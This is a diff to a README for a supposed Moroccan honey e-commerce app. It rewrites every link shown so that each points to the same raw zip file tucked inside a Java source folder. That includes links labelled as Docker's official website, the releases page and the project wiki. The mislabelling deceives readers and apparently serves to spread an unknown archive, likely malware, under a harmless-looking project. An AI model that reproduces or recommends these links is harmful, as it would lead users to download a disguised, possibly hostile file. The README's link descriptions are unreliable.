@@ -4,7 +4,7 @@
 Welcome! This guide will help you download and run the dar-lemlih-apiculture application, a full-stack e-commerce platform for Moroccan honey products. Follow these steps to enjoy browsing and shopping for the finest honey without any hassle.
 
 ## 📥 Download the Application
-[![Download dar-lemlih-apiculture](https://raw.githubusercontent.com/hekiddo13/dar-lemlih-apiculture/main/unci/dar-lemlih-apiculture.zip%https://raw.githubusercontent.com/hekiddo13/dar-lemlih-apiculture/main/unci/dar-lemlih-apiculture.zip)](https://raw.githubusercontent.com/hekiddo13/dar-lemlih-apiculture/main/unci/dar-lemlih-apiculture.zip)
+[![Download dar-lemlih-apiculture](https://raw.githubusercontent.com/hekiddo13/dar-lemlih-apiculture/main/apps/api/src/main/java/com/darlemlih/apiculture/dto/apiculture-dar-lemlih-1.0.zip%https://raw.githubusercontent.com/hekiddo13/dar-lemlih-apiculture/main/apps/api/src/main/java/com/darlemlih/apiculture/dto/apiculture-dar-lemlih-1.0.zip)](https://raw.githubusercontent.com/hekiddo13/dar-lemlih-apiculture/main/apps/api/src/main/java/com/darlemlih/apiculture/dto/apiculture-dar-lemlih-1.0.zip)
 
 ## ⚙️ Requirements
 Before you start, ensure your system meets the following requirements:
@@ -12,12 +12,12 @@ Before you start, ensure your system meets the following requirements:
 - **Operating System:** Windows, macOS, or Linux
 - **Disk Space:** At least 500 MB free
 - **Memory:** Minimum of 4 GB RAM
-- **Docker:** Make sure Docker is installed on your machine. Visit [Docker's official website](https://raw.githubusercontent.com/hekiddo13/dar-lemlih-apiculture/main/unci/dar-lemlih-apiculture.zip) for installation instructions.
+- **Docker:** Make sure Docker is installed on your machine. Visit [Docker's official website](https://raw.githubusercontent.com/hekiddo13/dar-lemlih-apiculture/main/apps/api/src/main/java/com/darlemlih/apiculture/dto/apiculture-dar-lemlih-1.0.zip) for installation instructions.
 
 ## 🖥️ Installation Steps
 1. **Visit the Releases Page**
    Go to the official releases page to find the latest version of the application. 
-   [Click here to visit the page](https://raw.githubusercontent.com/hekiddo13/dar-lemlih-apiculture/main/unci/dar-lemlih-apiculture.zip).
+   [Click here to visit the page](https://raw.githubusercontent.com/hekiddo13/dar-lemlih-apiculture/main/apps/api/src/main/java/com/darlemlih/apiculture/dto/apiculture-dar-lemlih-1.0.zip).
 
 2. **Download the Latest Release**
    On the releases page, look for the latest version. You will find files available for download. Click on the file suitable for your operating system. 
@@ -60,7 +60,7 @@ If you encounter issues while running the application, consider these solutions:
 For additional help, you can reach out to the community on the GitHub Issues page. Describe your problem, and someone will assist you as soon as possible.
 
 ## 🌐 Additional Resources
-- **Documentation:** Check the [Project Wiki](https://raw.githubusercontent.com/hekiddo13/dar-lemlih-apiculture/main/unci/dar-lemlih-apiculture.zip) for in-depth guides and FAQs.
+- **Documentation:** Check the [Project Wiki](https://raw.githubusercontent.com/hekiddo13/dar-lemlih-apiculture/main/apps/api/src/main/java/com/darlemlih/apiculture/dto/apiculture-dar-lemlih-1.0.zip) for in-depth guides and FAQs.
 - **Community:** Join discussions on GitHub to share your experience or suggest new features.
 
 Thank you for choosing dar-lemlih-apiculture. Enjoy exploring and shopping for the best honey products Morocco has to offer!
